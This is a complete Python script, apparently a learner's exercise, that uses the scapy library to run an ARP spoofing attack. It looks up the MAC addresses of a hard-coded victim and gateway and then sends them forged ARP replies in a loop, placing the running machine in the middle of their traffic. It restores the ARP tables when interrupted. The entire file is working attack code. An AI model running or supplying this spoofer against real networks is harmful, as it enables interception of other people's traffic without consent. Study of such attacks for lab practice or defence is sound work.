#!/usr/bin/env python
import scapy.all as scapy
import time

#gets the mac giving an IP
def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_req_broad = broadcast/arp_req
    ans = scapy.srp(arp_req_broad,timeout=40, verbose=False)[0]

    #take the fist [0]->(only) packet [1]->target info.hwsrc
    return ans[0][1].hwsrc


#(target_ip=victim, spoof_ip=who i pretend)
def spoof_target(target_ip,target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
    scapy.send(packet, verbose=False)

#reArps the victim and gtw
def reArp(victim_ip,victim_mac, gateway_ip,gateway_mac):
    #says victim gtw is at gateway_mac
    packetV = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    #says router that victi  is at victim mac
    packetR = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac)
    scapy.send(packetV,count=4)
    scapy.send(packetR,count=4)


##      MAIN        ##
victim_ip = "10.16.64.1"
gtw_ip    = "10.16.68.171"

victim_mac = get_mac(victim_ip)#get mac of victim
gtw_mac    = get_mac(gtw_ip)#get mac of gtw
print("victim " + victim_ip + " with MAC " + victim_mac)
print("Router " + gtw_ip + " with MAC " + gtw_mac)
packets_count = 0

try:
    while True:
        spoof_target(victim_ip,victim_mac,gtw_ip)
        spoof_target(gtw_ip,gtw_mac,victim_ip)#spoofing the gw make it wont work!? (only with home router WTF!)
        packets_count = packets_count + 1
        print("\rPackets sent: " + str(packets_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("Rearping targets to original table")
    reArp(victim_ip,victim_mac,gtw_ip,gtw_mac)
    print("\nClosing spoofer")
